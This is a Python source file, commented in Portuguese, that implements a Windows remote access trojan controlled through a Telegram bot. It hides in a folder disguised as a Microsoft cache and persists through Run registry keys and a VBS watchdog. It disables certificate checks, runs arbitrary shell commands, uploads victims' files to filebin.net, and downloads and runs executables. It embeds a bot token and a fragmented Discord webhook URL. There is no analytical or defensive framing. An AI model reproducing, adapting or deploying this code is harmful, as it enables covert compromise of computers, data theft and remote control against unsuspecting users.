import os
import sys
import subprocess
import urllib.request
import urllib.parse
import urllib.error
import json
import socket
import getpass
import time
import shutil
import uuid
import zipfile
import ssl

# Credenciais do Telegram
TELEGRAM_TOKEN = "7079752931:AAHkF6sDeRLZbrZcY5GUErD8w-8JVLHw-Ms"
TELEGRAM_CHAT_ID = "424786551"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/"

_H1 = "https://discordapp.com/api/"
_H2 = "webhooks/154012251745"
_H3 = "9570888/K-FBdGN8oWAu"
_H4 = "O1rJbREUoijMvAa4FZxp"
_H5 = "DCJZKs2Urx9QyBe4uUAC"
_H6 = "CxsDQ0Jp6r6L7mWE"
WEBHOOK_URL = _H1 + _H2 + _H3 + _H4 + _H5 + _H6

DIRETORIO_DESTINO = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), "Microsoft", "WindowsCache")
NOME_EXECUTAVEL = "WinSecurityHost.exe" if getattr(sys, 'frozen', False) else "vrs.py"
CAMINHO_FINAL = os.path.join(DIRETORIO_DESTINO, NOME_EXECUTAVEL)

NOME_MAQUINA = socket.gethostname()
diretorio_atual = os.getcwd()

# Contexto SSL global para ignorar certificados autoassinados/proxy corporativo
SSL_CONTEXTO = ssl._create_unverified_context()

def log_sistema(mensagem):
    try:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {mensagem}")
    except Exception:
        pass

def criar_observador_watchdog():
    try:
        watcher_path = os.path.join(DIRETORIO_DESTINO, "cache_guard.vbs")
        
        if getattr(sys, 'frozen', False):
            exec_command = f'"{CAMINHO_FINAL}"'
            query_filter = NOME_EXECUTAVEL
        else:
            exec_command = f'pythonw.exe \\"{CAMINHO_FINAL}\\"'
            query_filter = NOME_EXECUTAVEL

        vbs_script = f'Set objShell = CreateObject("WScript.Shell")\n' \
                     f'Set objFSO = CreateObject("Scripting.FileSystemObject")\n' \
                     f'Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")\n' \
                     f'TargetExe = "{CAMINHO_FINAL}"\n' \
                     f'Do\n' \
                     f'    On Error Resume Next\n' \
                     f'    Set colProcessos = objWMIService.ExecQuery("Select * from Win32_Process where CommandLine like \'%{query_filter}%\'")\n' \
                     f'    If colProcessos.Count > 1 Then\n' \
                     f'        For Each proc in colProcessos\n' \
                     f'            proc.Terminate()\n' \
                     f'        Next\n' \
                     f'    End If\n' \
                     f'    On Error Goto 0\n' \
                     f'    If objFSO.FileExists(TargetExe) Then\n' \
                     f'        Set colVerificacao = objWMIService.ExecQuery("Select * from Win32_Process where CommandLine like \'%{query_filter}%\'")\n' \
                     f'        If colVerificacao.Count = 0 Then\n' \
                     f'            objShell.Run "{exec_command}", 0, False\n' \
                     f'        End If\n' \
                     f'    End If\n' \
                     f'    WScript.Sleep 15000\n' \
                     f'Loop'
                     
        with open(watcher_path, "w", encoding="utf-8") as f:
            f.write(vbs_script)

        cmd_reg = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinCacheGuard" /t REG_SZ /d "wscript.exe //b \\"{watcher_path}\\"" /f'
        subprocess.run(cmd_reg, shell=True, capture_output=True)
    except Exception:
        pass

def instalar_e_persistir():
    try:
        if not os.path.exists(DIRETORIO_DESTINO):
            os.makedirs(DIRETORIO_DESTINO)
            subprocess.run(f'attrib +h "{DIRETORIO_DESTINO}"', shell=True)

        caminho_atual = os.path.abspath(sys.argv[0])
        
        if os.path.normpath(caminho_atual) != os.path.normpath(CAMINHO_FINAL):
            if os.path.exists(CAMINHO_FINAL):
                try:
                    os.remove(CAMINHO_FINAL)
                except:
                    pass
            shutil.copy2(caminho_atual, CAMINHO_FINAL)
            
            criar_observador_watchdog()

            if getattr(sys, 'frozen', False):
                subprocess.Popen([CAMINHO_FINAL], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen([sys.executable, CAMINHO_FINAL], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit()

        if getattr(sys, 'frozen', False):
            reg_payload = f'"{CAMINHO_FINAL}"'
        else:
            reg_payload = f'{sys.executable} \\"{CAMINHO_FINAL}\\"'

        cmd_reg = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateCheck" /t REG_SZ /d "{reg_payload}" /f'
        subprocess.run(cmd_reg, shell=True, capture_output=True)

        criar_observador_watchdog()
        log_sistema("Persistência configurada.")
    except Exception as e:
        log_sistema(f"Erro: {e}")

def obter_latencia_ping():
    inicio = time.time()
    try:
        req = urllib.request.Request("https://www.google.com", headers={'User-Agent': 'Mozilla/5.0'}, method='HEAD')
        urllib.request.urlopen(req, timeout=3, context=SSL_CONTEXTO)
        latencia = int((time.time() - inicio) * 1000)
        return f"{latencia}ms (Conectado)"
    except Exception:
        return "Sem conexão externa"

def enviar_telegram(mensagem):
    try:
        tamanho_bloco = 3500
        partes = [mensagem[i:i + tamanho_bloco] for i in range(0, len(mensagem), tamanho_bloco)]
        
        for parte in partes:
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": f"```{parte}```",
                "parse_mode": "Markdown"
            }
            data_json = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(
                f"{TELEGRAM_API_URL}sendMessage",
                data=data_json,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=10, context=SSL_CONTEXTO)
            time.sleep(0.3)
    except Exception as e:
        log_sistema(f"Erro ao enviar mensagem no Telegram: {e}")

def subir_arquivo_filebin(caminho_arquivo):
    caminho_zip_temporario = None
    try:
        caminho_arquivo = caminho_arquivo.strip()
        if not os.path.exists(caminho_arquivo):
            return f"Erro: O arquivo '{caminho_arquivo}' não foi encontrado."
        
        nome_original = os.path.basename(caminho_arquivo)
        nome_zip = f"{str(uuid.uuid4())[:8]}_payload.zip"
        caminho_zip_temporario = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), nome_zip)

        with zipfile.ZipFile(caminho_zip_temporario, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(caminho_arquivo, arcname=nome_original)

        tamanho_bytes = os.path.getsize(caminho_zip_temporario)
        bin_id = str(uuid.uuid4())[:12]
        url_upload = f"https://filebin.net/{bin_id}/{nome_zip}"

        with open(caminho_zip_temporario, "rb") as f:
            dados_arquivo = f.read()

        req = urllib.request.Request(
            url_upload,
            data=dados_arquivo,
            headers={'Content-Type': 'application/octet-stream', 'User-Agent': 'Mozilla/5.0'},
            method='POST'
        )

        with urllib.request.urlopen(req, timeout=45, context=SSL_CONTEXTO) as resposta:
            if resposta.status in (200, 201):
                link_download = f"https://filebin.net/{bin_id}/{nome_zip}"
                return f"[UPLOAD CONCLUÍDO (ZIP)]\nArquivo Original: {nome_original}\nTamanho Compactado: {tamanho_bytes} bytes\n\nLink Direto:\n{link_download}"
            else:
                return f"Erro no upload. Status HTTP: {resposta.status}"
    except Exception as e:
        return f"Erro ao processar/enviar arquivo: {str(e)}"
    finally:
        if caminho_zip_temporario and os.path.exists(caminho_zip_temporario):
            try:
                os.remove(caminho_zip_temporario)
            except:
                pass

def baixar_e_executar(parametro):
    try:
        partes = parametro.split("|")
        if len(partes) < 2:
            return "Erro: Formato inválido. Use: upload_exec: URL | nome.exe"
        
        url_arquivo = partes[0].strip()
        nome_salvar = partes[1].strip()
        caminho_destino = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), nome_salvar)
        
        req = urllib.request.Request(url_arquivo, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=30, context=SSL_CONTEXTO) as resposta, open(caminho_destino, 'wb') as f:
            f.write(resposta.read())
            
        subprocess.Popen([caminho_destino], creationflags=subprocess.CREATE_NO_WINDOW)
        return f"[SUCESSO] Arquivo executado em: {caminho_destino}"
    except Exception as e:
        return f"Erro ao baixar e executar: {str(e)}"

def executar_comando(comando):
    global diretorio_atual
    comando = comando.strip()
    if not comando:
        return "Comando vazio."

    if comando.lower() == "ping":
        latencia_atual = obter_latencia_ping()
        return f"Pong! Latência: {latencia_atual}. Host: {NOME_MAQUINA}"

    if comando.lower().startswith("download:"):
        return subir_arquivo_filebin(comando[9:].strip())

    if comando.lower().startswith("upload_exec:"):
        return baixar_e_executar(comando[12:].strip())

    if comando.startswith("cd "):
        novo_dir = comando[3:].strip()
        try:
            if novo_dir == "..":
                os.chdir("..")
            else:
                os.chdir(os.path.join(diretorio_atual, novo_dir) if not os.path.isabs(novo_dir) else novo_dir)
            diretorio_atual = os.getcwd()
            return f"Diretório alterado para: {diretorio_atual}"
        except Exception as e:
            return f"Erro ao mudar diretório: {str(e)}"

    try:
        res = subprocess.run(comando, shell=True, capture_output=True, text=True, encoding='cp850', errors='ignore', cwd=diretorio_atual, timeout=20)
        saida = res.stdout + res.stderr
        return saida.strip() if saida.strip() else "Comando executado com sucesso (sem retorno)."
    except Exception as e:
        return f"Erro na execução: {str(e)}"

if __name__ == "__main__":
    instalar_e_persistir()
    log_sistema("=== SCRIPT INICIADO ===")
    
    usuario = getpass.getuser()
    latencia_inicial = obter_latencia_ping()
    enviar_telegram(f"🟢 Sessão Iniciada\nHost: {NOME_MAQUINA} / User: {usuario}\nLatência: {latencia_inicial}\nDiretório: {diretorio_atual}")

    ultimo_update_id = 0

    while True:
        try:
            url_updates = f"{TELEGRAM_API_URL}getUpdates?offset={ultimo_update_id + 1}&timeout=20"
            req = urllib.request.Request(url_updates, headers={'User-Agent': 'Mozilla/5.0'})
            
            with urllib.request.urlopen(req, timeout=25, context=SSL_CONTEXTO) as resposta:
                dados = json.loads(resposta.read().decode('utf-8'))
                
                if dados.get("ok") and dados.get("result"):
                    for resultado in dados["result"]:
                        ultimo_update_id = resultado["update_id"]
                        
                        if "message" in resultado and "text" in resultado["message"]:
                            chat_id_recebido = str(resultado["message"]["chat"]["id"])
                            
                            if chat_id_recebido == TELEGRAM_CHAT_ID:
                                texto_completo = resultado["message"]["text"].strip()
                                
                                alvo = None
                                comando_real = texto_completo
                                
                                if ":" in texto_completo:
                                    partes_msg = texto_completo.split(":", 1)
                                    alvo = partes_msg[0].strip().lower()
                                    comando_real = partes_msg[1].strip()
                                
                                if alvo and alvo != NOME_MAQUINA.lower():
                                    continue
                                
                                log_sistema(f">>> COMANDO VIA TELEGRAM: {comando_real}")
                                resultado_cmd = executar_comando(comando_real)
                                
                                enviar_telegram(f"📦 Resposta ({NOME_MAQUINA} -> {comando_real}):\n{resultado_cmd}")
        except Exception as e:
            log_sistema(f"Erro no loop do Telegram: {e}")
            time.sleep(10)
        
        time.sleep(2)